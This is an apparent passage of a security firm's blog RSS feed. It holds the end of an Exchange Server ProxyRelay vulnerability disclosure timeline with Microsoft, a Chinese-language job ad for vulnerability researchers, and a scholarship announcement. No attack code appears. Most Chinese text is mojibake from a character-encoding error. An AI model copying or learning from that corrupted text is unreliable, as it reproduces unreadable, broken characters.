  &lt;li&gt;&lt;strong&gt;Sep 01, 2021&lt;/strong&gt; - MSRC said this case has been expanding into a design change and the intended release date is &lt;strong&gt;December 2021&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sep 08, 2021&lt;/strong&gt; - We asked is it possible to shorten the time frame because we would like to disclose this at conferences.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sep 17, 2021&lt;/strong&gt; - MSRC replied there are not quick and simple fixes but design level changes, they canâ€™t get the changes in October.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Oct 25, 2021&lt;/strong&gt; - We decided not to disclose this at conferences and gave the team a fair time for fixing and testing. We hoped this bug could be fixed as scheduled in December 2021.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Dec 21, 2021&lt;/strong&gt; - We asked for updates on this case.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Dec 22, 2021&lt;/strong&gt; - MSRC replied they aimed to include this patch in a CU (Cumulative Update) instead of an SU (Security Update) due to the level of changes. The next CU release date will be in &lt;strong&gt;March 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 04, 2022&lt;/strong&gt; - We asked that we donâ€™t see the CU in March. When is the new release date?&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 13, 2022&lt;/strong&gt; - MSRC replied the CU is delayed, and the current release date is on &lt;strong&gt;April 20, 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 20, 2022&lt;/strong&gt; - Microsoft released &lt;a href=&quot;https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8&quot;&gt;Exchange Server 2019 CU 12&lt;/a&gt; and &lt;a href=&quot;https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678&quot;&gt;Exchange Server 2016 CU 23&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 21, 2022&lt;/strong&gt; - We found our exploit still works fine on the latest version of Exchange Server and asked is this bug really fixed?&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 27, 2022&lt;/strong&gt; - MSRC replied the CU contain the code change, but it needs to be activated manually or with a script. There are still some testing concerns but the manual activation process will be public on &lt;strong&gt;May 10, 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;May 11, 2022&lt;/strong&gt; - MSRC said the documentation and the script are mapped for the Patching Tuesday of June 2022 (&lt;strong&gt;Jun 14, 2022&lt;/strong&gt;).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 10, 2022&lt;/strong&gt; - MSRC said there are still having some issues on testing and they are looking to release this in &lt;strong&gt;July 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jul 04, 2022&lt;/strong&gt; - We asked if it will release in this monthâ€™s Patching Tuesday.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aug 10, 2022&lt;/strong&gt; - Donâ€™t see anything, asked again.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aug 18, 2022&lt;/strong&gt; - Microsoft released the CVE and &lt;a href=&quot;https://techcommunity.microsoft.com/t5/exchange-team-blog/released-august-2022-exchange-server-security-updates/ba-p/3593862&quot;&gt;the patch activation documentation&lt;/a&gt;!&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/</link>
                <guid>https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay</guid>
                <pubDate>Wed, 19 Oct 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE å¾µæ±‚è³‡å®‰ç ”ç©¶å“¡</title>
                <description>&lt;p&gt;ä½ å°è³‡å®‰ç ”ç©¶æœ‰æ»¿è…”ç†±è¡€ä½†å»æ‰¾ä¸åˆ°äººè¨è«–å—ï¼Ÿ
å¸¸å¸¸åƒåŠ å„å¤§ CTF æ¯”è³½ï¼Œå»ä¸çŸ¥å¦‚ä½•å°‡å­¸æœƒçš„æŠ€èƒ½ç™¼æ®åœ¨çœŸå¯¦ä¸–ç•Œä¸­å—ï¼Ÿ
ä½ ä¹Ÿæƒ³è¦ç‚ºä¿è­·ä¸–ç•Œç›¡ä¸€ä»½å¿ƒåŠ›å—ï¼Ÿ&lt;/p&gt;

&lt;p&gt;DEVCORE Research Team æˆç«‹æ•¸å¹´ä¾†æŒçºŒç ”ç©¶æœ€å‰ç»çš„è³‡å®‰æŠ€è¡“ï¼Œå›å ±éå¤šå€‹ä¸–ç•Œç´šçš„æ¼æ´ï¼Œåœ¨ Black Hatã€DEFCON ç­‰åœ‹éš›è³‡å®‰ç ”è¨æœƒéƒ½èƒ½çœ‹è¦‹æˆ‘å€‘çš„æˆ°ç¸¾ï¼ŒPwnie Awardsã€Best Web Hacking Techniques å„ç¨®çé …æˆ‘å€‘ä¹Ÿæ¯«ä¸ç•™æƒ…åœ°æ©«æƒï¼Œåœ¨ Pwn2Own é§­å®¢å¤§è³½ä¸­æ›´æ˜¯åˆ—å±…é¦–ä½ï¼ç„¶è€Œï¼Œè³‡å®‰é ˜åŸŸä¹‹å»£ã€æ›´è¿­é€Ÿåº¦ä¹‹å¿«ï¼Œå–®æ†‘å¯¥å¯¥æ•¸äººä¹Ÿæ˜¯åŠ›æœ‰æœªé€®ï¼Œ&lt;/p&gt;

&lt;p&gt;ä¸€å€‹äººèµ°ï¼Œå¯ä»¥èµ°å¾—å¾ˆå¿«ï¼›ä½†ä¸€ç¾¤äººèµ°ï¼Œå¯ä»¥èµ°å¾—æ›´é ã€‚&lt;/p&gt;

&lt;p&gt;æ•…æ­¤ï¼ŒWe Need YOU!&lt;/p&gt;

&lt;p&gt;ç¾åœ¨ï¼ŒDEVCORE Research Team å…¬é–‹å¾µæ±‚è³‡å®‰ç ”ç©¶å“¡å›‰ï¼ä¸è«–ä½ æ˜¯å°ˆç²¾æ–¼ç¶²é å®‰å…¨ï¼Œæˆ–æ˜¯å°é€†å‘å·¥ç¨‹æƒ…æœ‰ç¨é¾ï¼Œç”šè‡³ä½ å–œæ­¡å‹•æ‰‹æ‹†è§£ç¡¬é«”ï¼Œæˆ‘å€‘ä¸éœ€è¦ä½ çš„è‚ï¼Œåªéœ€è¦ä½ å°æ–¼è³‡å®‰ç ”ç©¶çš„ç†±å¿±ï¼æˆ‘å€‘çœ‹é‡çš„ä¸æ˜¯å·¥ä½œç¶“é©—ï¼Œè€Œæ˜¯å°è³‡å®‰å‚¾æ³¨éå¤šå°‘å¿ƒåŠ›ï¼&lt;/p&gt;

&lt;p&gt;åœ¨é€™è£¡å·¥ä½œï¼Œä½ å°‡å¯ä»¥å¾—åˆ°&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;èˆ‡é ‚å°–é§­å®¢ä¸€èµ·äº¤æµã€åˆä½œçš„å¯¶è²´ç¶“é©—&lt;/li&gt;
  &lt;li&gt;å¯¦éš›é«”é©—ä¸¦æŒ–æ˜ Real World æ¼æ´ï¼Œæ‰¾åˆ°å±¬æ–¼è‡ªå·±çš„ç¬¬ä¸€å€‹ CVEï¼&lt;/li&gt;
  &lt;li&gt;æ·±å…¥æ¥­ç•Œå¯¦æˆ°æ”»é˜²ï¼ŒçœŸå¯¦æ„Ÿå—æ¼æ´ç ”ç©¶èˆ‡ä¼æ¥­è³‡å®‰çš„çµåˆ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æƒ³æŠŠé§­å®¢ä½œç‚ºä½ çš„çµ‚èº«è·å—ï¼Ÿæ­¡è¿å„é ˜åŸŸçš„é§­å®¢å€‘ä¸€èµ·åŠ å…¥ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å·¥ä½œå…§å®¹&quot;&gt;å·¥ä½œå…§å®¹&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;å€‹äººç ”ç©¶ 70%
    &lt;ul&gt;
      &lt;li&gt;å°å½±éŸ¿ä¸–ç•Œçš„ç”¢å“é€²è¡Œæ¼æ´ç ”ç©¶&lt;/li&gt;
      &lt;li&gt;å°‡æ‰¾åˆ°çš„æ¼æ´å›å ±å» å•†ä¸¦é€²è¡Œæ¼æ´ç™¼è¡¨&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æª¢æ¸¬æˆ–å”åŠ©å°ˆæ¡ˆ 30%
    &lt;ul&gt;
      &lt;li&gt;è¦åŠƒã€åŸ·è¡Œç”¢å“å®‰å…¨æ¸¬è©¦&lt;/li&gt;
      &lt;li&gt;æ ¹æ“šæª¢æ¸¬éœ€æ±‚ï¼Œç ”ç©¶ç›¸é—œå¼±é»æˆ–é–‹ç™¼ç›¸é—œå·¥å…·&lt;/li&gt;
      &lt;li&gt;å”åŠ©ç´…éšŠåŸ·è¡Œå°ˆæ¡ˆï¼Œæä¾›æŠ€è¡“ç«åŠ›æ”¯æ´&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œæ¢ä»¶è¦æ±‚&quot;&gt;å·¥ä½œæ¢ä»¶è¦æ±‚&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;å…·å‚™æ¼æ´æŒ–æ˜èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;å…·å‚™æ¼æ´åˆ©ç”¨ç¨‹å¼æ’°å¯«èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;å…·å‚™åŸºæœ¬ç¨‹å¼èªè¨€é–‹ç™¼èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;å…·å‚™ç ”ç©¶ç†±èª ï¼Œç¿’æ…£äº†è§£æŠ€è¡“æœ¬è³ª&lt;/li&gt;
  &lt;li&gt;å…·å‚™ç‰¹å®šé ˜åŸŸè³‡å®‰ç›¸é—œçŸ¥è­˜ï¼ŒåŒ…å«ä½†ä¸é™æ–¼
    &lt;ul&gt;
      &lt;li&gt;ä¸»æµä½œæ¥­ç³»çµ±é‹ä½œæ©Ÿåˆ¶ã€ç›¸é—œæ¼æ´åŠå…¶åˆ©ç”¨æŠ€è¡“&lt;/li&gt;
      &lt;li&gt;ä¸»æµç€è¦½å™¨æ¶æ§‹ã€ç›¸é—œæ¼æ´åŠå…¶åˆ©ç”¨æŠ€è¡“&lt;/li&gt;
      &lt;li&gt;ç¡¬é«”ä»‹é¢ç›¸é—œæ”»æ“Šæ‰‹æ³•ã€å…·å¯¦ä½œç¶“é©—&lt;/li&gt;
      &lt;li&gt;æ‰‹æ©Ÿåº•å±¤éŸŒé«”æ¶æ§‹åŠé˜²ç¦¦æ©Ÿåˆ¶&lt;/li&gt;
      &lt;li&gt;ç¶²é æ‡‰ç”¨ç¨‹å¼æ”»æ“Šæ‰‹æ³•&lt;/li&gt;
      &lt;li&gt;ç¶²è·¯ç›¸é—œæ”»æ“Šæ‰‹æ³•&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;åŠ åˆ†æ¢ä»¶&quot;&gt;åŠ åˆ†æ¢ä»¶&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;CTF æ¯”è³½ç¶“é©—&lt;/li&gt;
  &lt;li&gt;pwnable.tw æˆç¸¾&lt;/li&gt;
  &lt;li&gt;Flare-On æˆç¸¾&lt;/li&gt;
  &lt;li&gt;å…¬é–‹çš„æŠ€è¡“ blog/slide/write-ups æˆ– side projects&lt;/li&gt;
  &lt;li&gt;Bug Bounty / æ¼æ´å›å ±ç¶“é©—&lt;/li&gt;
  &lt;li&gt;è³‡å®‰ç ”è¨æœƒæ¼”è¬›ç¶“é©—&lt;/li&gt;
  &lt;li&gt;è³‡å®‰ç›¸é—œæ•™å­¸ç¶“é©—&lt;/li&gt;
  &lt;li&gt;å–œæ­¡è‡ªå·±å‹•æ‰‹æ’°å¯«å·¥å…·&lt;/li&gt;
  &lt;li&gt;ä¸»å‹•è¿½è¹¤ä¸¦å­¸ç¿’æœ€æ–°è³‡å®‰ç›¸é—œæŠ€è¡“&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;èµ·è–ªç¯„åœ&quot;&gt;èµ·è–ªç¯„åœ&lt;/h3&gt;
&lt;p&gt;æ–°å°å¹£ 80,000 - 100,000 ï¼ˆä¿è­‰å¹´è–ª 14 å€‹æœˆï¼‰&lt;/p&gt;

&lt;p&gt;è©³ç´°çš„å·¥ä½œç’°å¢ƒèˆ‡æ‡‰å¾µæ–¹å¼è«‹åƒè€ƒ&lt;a href=&quot;https://devco.re/company/jobs/&quot;&gt;æ‹›å‹Ÿé é¢&lt;/a&gt;&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2022/09/21/202209-security-researcher-recruitment/</link>
                <guid>https://devco.re/blog/2022/09/21/202209-security-researcher-recruitment</guid>
                <pubDate>Wed, 21 Sep 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>æˆ´å¤«å¯‡çˆ¾æŒçºŒæŠ•å…¥è³‡å®‰äººæ‰åŸ¹è‚² - å•Ÿå‹•å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘è¨ˆåŠƒã€å»¶çºŒè³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆåŠƒ</title>
                <description>&lt;p&gt;æˆ´å¤«å¯‡çˆ¾è‡ª 2012 å¹´æˆç«‹ä»¥ä¾†ï¼Œç§‰æŒè‘—ç‚ºå°ç£ç´¯ç©æ›´è±åšçš„è³‡å®‰ç«¶çˆ­åŠ›ï¼Œä¸åªé€éä¸»å‹•å¼è³‡å®‰æœå‹™å”åŠ©ä¼æ¥­æª¢æ¸¬è³‡å®‰é˜²ç¦¦ï¼Œé€²è€Œæå‡æ•´é«”è³‡å®‰é«”è³ªï¼›åŒæ™‚æˆ‘å€‘ä¹Ÿå¾ˆé—œæ³¨è³‡å®‰æŠ€è¡“äººæ‰çš„åŸ¹è‚²ï¼Œé™¤äº†æ“”ä»»å­¸è¡“ã€æ”¿åºœå–®ä½å°ˆä»»è¬›å¸«åŠé¡§å•ä»¥å¤–ï¼Œä¹Ÿé•·æœŸæ”¯æŒå­¸ç”Ÿæ™‚æœŸå‰µè¾¦çš„æ ¡åœ’è³‡å®‰ç¤¾åœ˜ NISRAï¼ˆNetwork and Information Security Research Associationï¼‰ï¼Œå¹«åŠ©å­¸ç”Ÿå€‘å¾å­¸ç”Ÿæ™‚ä»£å»ºæ§‹æ­£ç¢ºçš„è³‡è¨Šå®‰å…¨æ„è­˜åŠæŠ€èƒ½å¤–ï¼Œä¹Ÿæ›´æ—©ç­è§£è³‡å®‰ç”¢æ¥­çš„ç¾æ³ï¼Œèˆ‡ç”¢æ¥­ç•Œæ¥è»Œã€‚&lt;/p&gt;

&lt;p&gt;è¿‘ä¾†ç”¢æ¥­ç´›ç´›åŠ é€Ÿæ•¸ä½è½‰å‹è…³æ­¥ï¼Œè³‡å®‰äº‹ä»¶é »å‚³ï¼ŒåŠ ä¸Šç›¸é—œæ³•è¦çš„å¢è¨­åŠæ–½è¡Œï¼Œæˆ‘å€‘ä¹Ÿè§€å¯Ÿåˆ°è³‡å®‰é‡è¦æ€§çš„é—œæ³¨åº¦éƒ½å¤§å¹…æé«˜ï¼Œç‚ºäº†åŸ¹é¤Šæ›´å¤šäººå¯ä»¥ç†è§£ã€Œé§­å®¢æ€ç¶­ã€ã€èƒ½æ¨¡æ“¬é§­å®¢æ”»æ“Šæƒ…å¢ƒã€æ‰¾å‡ºæ½›åœ¨è³‡å®‰é¢¨éšªï¼Œæˆ‘å€‘å°‡æ“´å¤§æ–½è¡Œã€Œè³‡å®‰äººæ‰åŸ¹è‚²è¨ˆç•«ã€ï¼Œé€é&lt;strong&gt;æˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘&lt;/strong&gt;åŠ&lt;strong&gt;è´ŠåŠ©è³‡å®‰æ•™è‚²æ´»å‹•&lt;/strong&gt;ç­‰ï¼Œæ”¯æŒæ›´å¤šå¿—åŒé“åˆçš„å­¸å­å€‘é—œæ³¨è³‡å®‰è­°é¡Œï¼ŒåŠæ—©å¢å¼·è³‡å®‰æŠ€èƒ½ã€‚&lt;/p&gt;

&lt;h3 id=&quot;æ”¯æŒä¸‹ä¸€ä»£è³‡å®‰äººæ‰---æˆ´å¤«å¯‡çˆ¾å•Ÿå‹•æˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘è¨ˆåŠƒ&quot;&gt;æ”¯æŒä¸‹ä¸€ä»£è³‡å®‰äººæ‰ - æˆ´å¤«å¯‡çˆ¾å•Ÿå‹•ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€è¨ˆåŠƒ&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘å¾å­¸ç”Ÿæ™‚ä»£å°±ç†±è¡·æ–¼è³‡å®‰ç ”ç©¶ï¼Œä¹Ÿé€éæ ¡åœ’èª²ç¨‹ã€ç¤¾åœ˜ NISRA ç²å¾—å……å¯¦çš„è³‡å®‰çŸ¥è­˜ï¼Œæœ‰æ„Ÿæ–¼æ­¤ï¼Œæˆ‘å€‘å‰µç«‹æˆ´å¤«å¯‡çˆ¾å¾Œä¹Ÿç‚ºæ¯æ ¡â€”å¤©ä¸»æ•™è¼”ä»å¤§å­¸ã€åœ‹ç«‹è‡ºç£ç§‘æŠ€å¤§å­¸çš„å­¸ç”Ÿè¨­ç«‹äº†çå­¸é‡‘è¨ˆç•«ï¼Œç‚ºå­¸ç”Ÿçš„è³‡å®‰å­¸ç¿’ä¹‹è·¯å¥‰ç»ä¸€é»åŠ›é‡ã€‚&lt;/p&gt;

&lt;p&gt;æ­¤è¨ˆç•«åœ¨ 2022å¹´ï¼ˆ111 å­¸å¹´åº¦ï¼‰å·²é‚å…¥ç¬¬ 4 å¹´ï¼Œæˆ‘å€‘ä¹Ÿæ“´å¤§è£œåŠ©çš„ç¯„ç–‡ï¼Œé¦–åº¦ç‚ºå…¨åœ‹å¤§å°ˆé™¢æ ¡å­¸ç”Ÿæ¨å‡ºã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€ï¼Œåªè¦åœ¨è³‡è¨Šå®‰å…¨é ˜åŸŸæœ‰å‡ºçœ¾ç ”ç©¶æˆæœçš„å­¸ç”Ÿï¼Œçš†å¯ä»¥ç”³è«‹ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€è£œåŠ©ï¼Œå¹«åŠ©å¤§å®¶åœ¨æ±‚å­¸æœŸé–“æ›´åŠ å°ˆæ³¨å­¸ç¿’ã€å¥ å®šè³‡å®‰å°ˆé•·ï¼Œé€²è€Œå½¢æˆæ­£å‘å¾ªç’°ã€‚&lt;/p&gt;

&lt;p&gt;æœ‰æ„ç”³è«‹è€…éœ€æå‡ºå­¸ç¿’è³‡å®‰çš„å‹•æ©Ÿèˆ‡æ­·ç¨‹ï¼Œä¸¦ç¹³äº¤è³‡å®‰ç ”ç©¶æˆ–æ¯”è³½æˆæœï¼Œç²é¸è€…å°‡èƒ½å¾—åˆ°æœ€é«˜ 2 è¬å…ƒçš„ç ”ç©¶è£œåŠ©ï¼Œå…± 10 åã€‚è©³ç´°ç”³è«‹è¾¦æ³•è«‹è¦‹ä»¥ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ç”³è«‹è³‡æ ¼&lt;/strong&gt;ï¼šå…¨åœ‹å„å¤§å°ˆé™¢æ ¡å­¸ç”Ÿçš†å¯ä»¥ç”³è«‹ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;çå­¸é‡‘é‡‘é¡/åé¡&lt;/strong&gt;ï¼šæ¯å¹´åº¦å– 10 åï¼Œæ¯åå¯ç²å¾—çå­¸é‡‘æ–°å°å¹£ 20,000 å…ƒæ•´ï¼Œå…±è¨ˆ 20 è¬å…ƒã€‚å¦‚å ±åè¸´èºæˆ‘å€‘å°‡è¦–ç”³è«‹ç‹€æ³å¢åŠ åé¡ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç”³è«‹æ™‚ç¨‹&lt;/strong&gt;ï¼š
    &lt;ul&gt;
      &lt;li&gt;2022/8/31 å®˜ç¶²å…¬å‘Šçå­¸é‡‘è¨ˆç•«è³‡è¨Š&lt;/li&gt;
      &lt;li&gt;2022/9/1 - 2022/9/30 é–‹æ”¾æ”¶ä»¶&lt;/li&gt;
      &lt;li&gt;2022/10/31 å…¬å¸ƒå¯©æŸ¥çµæœï¼Œä¸¦å°‡æ–¼ 10 è‡³ 11 æœˆé–“é ’ç™¼çå­¸é‡‘&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç”³è«‹è¾¦æ³•&lt;/strong&gt;ï¼š
    &lt;ul&gt;
      &lt;li&gt;è«‹ä¾â½‚ä»¶æª¢æ ¸è¡¨é …æ¬¡é †åºæ’åˆ—å·²é™„â½‚ä»¶ï¼Œå½™æ•´ç‚ºâ¼€ä»½ PDF æª”æ¡ˆï¼Œå¯„â¾„ scholarship@devco.reã€‚&lt;/li&gt;
      &lt;li&gt;ä¿¡ä»¶ä¸»æ—¨åŠ PDF æª”æ¡ˆåç¨±è«‹ç¬¦åˆä»¥ä¸‹æ ¼å¼ï¼š[å…¨åœ‹çå­¸â¾¦ç”³è«‹] å­¸æ ¡åç¨±_å­¸è™Ÿ_å§“åï¼ˆç¯„ä¾‹ï¼š[å…¨åœ‹çå­¸â¾¦ç”³è«‹] è¼”ä»â¼¤å­¸_B11100000_ç‹â¼©ç¾ï¼‰ã€‚&lt;/li&gt;
      &lt;li&gt;è«‹ç”³è«‹â¼ˆâ¾ƒæˆ‘æª¢æ ¸ä¸¦æ–¼ç”³è«‹â¼ˆæª¢æ ¸å€å‹¾é¸å·²é™„â½‚ä»¶ï¼Œè‹¥â½‚ä»¶ä¸â¿‘æˆ–æœªç¢ºå¯¦å‹¾é¸æ•ä¸å—ç†ç”³è«‹ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;éœ€æª¢é™„æ–‡ä»¶&lt;/strong&gt;ï¼š
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;/assets/files/scholarship/æˆ´å¤«å¯‡çˆ¾å…¨åœ‹çå­¸é‡‘ç”³è«‹è¡¨.pdf&quot;&gt;æœ¬çå­¸â¾¦ç”³è«‹è¡¨&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;åœ¨å­¸è­‰æ˜&lt;/li&gt;
      &lt;li&gt;æœ€è¿‘â¼€å­¸æœŸæˆç¸¾å–®&lt;/li&gt;
      &lt;li&gt;å­¸ç¿’è³‡è¨Šå®‰å…¨ä¹‹å‹•æ©Ÿèˆ‡æ­·ç¨‹â¼¼å¾—â¼€ç¯‡ï¼šå­—æ•¸ 500 - 2000 å­—&lt;/li&gt;
      &lt;li&gt;è³‡è¨Šå®‰å…¨æŠ€è¡“ç›¸é—œç ”ç©¶æˆæœï¼šè‡³å°‘é ˆå¾ä»¥ä¸‹å…­é …ç›®ä¸­æ“‡ä¸€ç¹³äº¤ï¼ŒåŒ…å«ç ”è¨æœƒæŠ•ç¨¿çµæœã€æ¼æ´çå‹µè¨ˆç•«æˆæœã€å¼±é»ç ”ç©¶æˆæœã€è³‡è¨Šå®‰å…¨æ¯”è³½æˆæœã€è³‡å®‰å·¥å…·ç ”ç©¶æˆæœã€æŠ€è¡“æ–‡ç« ç™¼è¡¨æˆæœç­‰&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤ç¶“ç‡Ÿæˆæœï¼šè‡³å°‘é ˆå¾ä»¥ä¸‹å…©é …ç›®ä¸­æ“‡ä¸€ç¹³äº¤ï¼ŒåŒ…å«æ ¡åœ’è³‡å®‰ç¤¾åœ˜ã€å…¬é–‹è³‡å®‰ç¤¾ç¾¤ç­‰&lt;/li&gt;
      &lt;li&gt;æ¨è–¦å‡½ï¼šå°å¸«ã€ç³»ä¸»ä»»ã€å…¶ä»–æ•™æˆæˆ–æ¥­ç•Œâ¼ˆâ¼ æ¨è–¦å‡½ï¼Œâ¾„å°‘é ˆå–å¾—å…©å°ä»¥ä¸Šæ¨è–¦å‡½&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ”¯æŒæ›¾ç¶“çš„æˆ‘å€‘---æˆ´å¤«å¯‡çˆ¾çºŒè¾¦-2022-å¹´è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆåŠƒ&quot;&gt;æ”¯æŒæ›¾ç¶“çš„æˆ‘å€‘ - æˆ´å¤«å¯‡çˆ¾çºŒè¾¦ 2022 å¹´è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆåŠƒ&lt;/h3&gt;

&lt;p&gt;èº«ç‚ºè³‡å®‰äººï¼Œæˆ‘å€‘åœ¨å­¸ç”Ÿæ™‚æœŸæ‰€ç´¯ç©å°è³‡å®‰ç†±æƒ…å’Œå¥½å¥‡å¿ƒï¼Œæ”¯æ’è‘—æˆ‘å€‘ä¸€è·¯èµ°ä¾†ï¼Œä¸å¿˜åˆè¡·åœ°å”é˜²å°ç£å®‰å…¨ï¼ŒåŒæ™‚ä¹ŸæœŸæœ›å¯ä»¥ç”¨ä¸€é»åŠ›é‡ç‚ºç¤¾æœƒå¸¶ä¾†è²¢ç»ï¼ŒæœŸç›¼åœ¨æœªä¾†å¯ä»¥å¹«åŠ©æ›´å¤šç¤¾åœ˜æˆ–ç¤¾ç¾¤çš„åŠ›é‡æˆç‚ºåŸ¹é¤Šå°ˆæ¥­çš„é¤Šåˆ†ã€‚&lt;/p&gt;

&lt;p&gt;å› æ­¤ï¼Œä»Šå¹´åº¦æˆ‘å€‘ä¹Ÿå°‡æŒçºŒè´ŠåŠ©è³‡å®‰æ•™è‚²æ´»å‹•ï¼Œæä¾›ç¶“è²»äºˆè³‡å®‰ç›¸é—œä¹‹ç¤¾ç¾¤ã€ç¤¾åœ˜è¾¦ç†å„é …æ´»å‹•ï¼Œè—‰æ­¤é™ä½è³‡å®‰çŸ¥è­˜è½å·®ï¼ŒæŒçºŒæ¨å»£è³‡è¨Šå®‰å…¨æ„è­˜åŠæŠ€èƒ½ï¼Œæ›´é€²ä¸€æ­¥å‡èšå°ç£è³‡å®‰ç¤¾ç¾¤çš„åŠ›é‡ï¼Œå¹«åŠ©å°ç£åŸ¹é¤Šä¸‹ä¸€å€‹ä¸–ä»£çš„è³‡å®‰äººæ‰ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ç”³è«‹è³‡æ ¼&lt;/strong&gt;ï¼šèˆ‡è³‡å®‰è­°é¡Œç›¸é—œä¹‹ç¤¾ç¾¤ã€ç¤¾åœ˜æ´»å‹•ï¼Œè«‹ç”± 1 ä½ç¤¾åœ˜ä»£è¡¨äººå¡«å¯«è³‡æ–™ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;è´ŠåŠ©é‡‘é¡&lt;/strong&gt;ï¼šä¾å„ç¤¾åœ˜æ´»å‹•éœ€æ±‚åŠèˆ‡æˆ´å¤«å¯‡çˆ¾è¨è«–è€Œå®šï¼Œæ¯æ¬¡æœ€é«˜è£œåŠ©é‡‘é¡ç‚ºæ–°å°å¹£ 20,000 å…ƒæ•´ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç”³è«‹æ™‚ç¨‹&lt;/strong&gt;ï¼šå¦‚æ¬²ç”³è«‹æ­¤è¨ˆç•«çš„ç¤¾åœ˜æˆ–æ´»å‹•ï¼Œè«‹æ–¼ 2022/10/31 å‰é€éä»¥ä¸‹é€£çµå¡«å¯«åˆæ­¥è³‡æ–™ï¼Œæˆ‘å€‘æœƒåœ¨ 30 æ—¥å…§é€šçŸ¥ç¬¦åˆç”³è«‹è³‡æ ¼è€…æä¾›é€²ä¸€æ­¥è³‡æ–™ï¼Œä¸ç¬¦åˆè³‡æ ¼è€…å°‡ä¸å¦è¡Œé€šçŸ¥ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç”³è«‹é€£çµ&lt;/strong&gt;ï¼š&lt;a href=&quot;https://forms.gle/dW3GcGjw5z8WQ9pV9&quot;&gt;DEVCORE 2022 å¹´è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©èª¿æŸ¥&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;éœ€æä¾›è³‡æ–™&lt;/strong&gt;ï¼š
    &lt;ul&gt;
      &lt;li&gt;ç”³è«‹è³‡æ ¼ï¼šç”³è«‹äººéœ€ä»¥å„è³‡å®‰ç¤¾ç¾¤æˆ–ç¤¾åœ˜åç¾©æå‡ºç”³è«‹ã€‚&lt;/li&gt;
      &lt;li&gt;è¯çµ¡é›»å­éƒµä»¶&lt;/li&gt;
      &lt;li&gt;æƒ³è¦è¾¦ç†çš„æ´»å‹•é¡å‹&lt;/li&gt;
